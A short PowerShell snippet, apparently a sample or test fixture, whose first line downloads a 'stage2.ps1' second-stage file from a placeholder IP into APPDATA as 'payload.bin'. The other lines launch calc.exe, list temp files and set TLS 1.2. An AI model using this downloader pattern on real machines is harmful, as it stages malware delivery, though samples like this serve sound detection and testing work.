
Invoke-WebRequest -Uri 'https://192.0.2.98/stage2.ps1' -OutFile "$env:APPDATA\payload.bin" -UseBasicParsing
Start-Process -FilePath "calc.exe"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
